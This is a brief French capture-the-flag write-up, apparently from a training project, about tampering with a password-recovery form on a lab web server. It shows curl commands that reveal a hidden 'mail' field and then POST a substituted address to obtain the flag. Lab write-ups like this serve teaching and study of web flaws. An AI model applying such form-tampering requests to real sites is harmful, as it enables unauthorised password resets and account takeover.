http://192.168.1.87/?page=recover
<img width="1092" height="673" alt="image" src="https://github.com/user-attachments/assets/29f729d2-735a-4c1c-a832-748726c812a0" />

aucun champ email n’est affiché. Pourtant, le formulaire de récupération de mot de passe utilise un champ hidden nommé mail.

Pour le trouver, on récupère le HTML complet :

curl -s "http://192.168.1.87/?page=recover"

<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value="Submit">
</form>

Même si on envoie une autre adresse email, le serveur utilise toujours la valeur du champ hidden.

On envoie donc une requête POST :

curl -s -X POST "http://192.168.1.87/index.php?page=recover" \
-d "mail=test@test.com&Submit=Submit" | grep -i flag

<img width="1079" height="573" alt="image" src="https://github.com/user-attachments/assets/7e9e596d-3138-4bb9-b049-e3d6634253c2" />
